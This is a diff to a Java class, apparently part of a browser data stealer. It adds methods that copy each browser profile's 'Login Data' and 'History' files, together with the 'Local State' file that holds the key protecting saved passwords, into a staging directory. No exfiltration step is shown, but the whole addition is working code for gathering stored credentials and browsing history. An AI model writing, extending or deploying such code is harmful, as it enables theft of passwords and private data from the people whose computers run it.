@@ -48,4 +48,45 @@ public class CopyFiles {
         }
     }
 
+    public void copyLoginData(ArrayList<Path> profiles, Path localState, String browserName) throws IOException {
+
+        File directory = createDirectory(browserName);
+        Path localStateCopy = Path.of(directory + "/Local State");
+
+        for (Path profile : profiles) {
+
+            Path loginData = Path.of(profile + "/Login Data");
+            Path loginDataCopy = Path.of(directory + "/Login Data");
+
+
+            if (Files.exists(loginData) && !Files.exists(loginDataCopy)) {
+                Files.copy(loginData, loginDataCopy, StandardCopyOption.REPLACE_EXISTING);
+            }
+        }
+
+        if (Files.exists(localState) && !Files.exists(localStateCopy)) {
+            Files.copy(localState, localStateCopy, StandardCopyOption.REPLACE_EXISTING);
+        }
+    }
+
+    public void copyHistory(ArrayList<Path> profiles, Path localState, String browserName) throws IOException {
+
+        File directory = createDirectory(browserName);
+        Path localStateCopy = Path.of(directory + "/Local State");
+
+        for (Path profile : profiles) {
+
+            Path history = Path.of(profile + "/History");
+            Path historyCopy = Path.of(directory + "/History");
+
+            if (Files.exists(history) && !Files.exists(historyCopy)) {
+                Files.copy(history, historyCopy, StandardCopyOption.REPLACE_EXISTING);
+            }
+        }
+
+        if (Files.exists(localState) && !Files.exists(localStateCopy)) {
+            Files.copy(localState, localStateCopy, StandardCopyOption.REPLACE_EXISTING);
+        }
+    }
+
 }
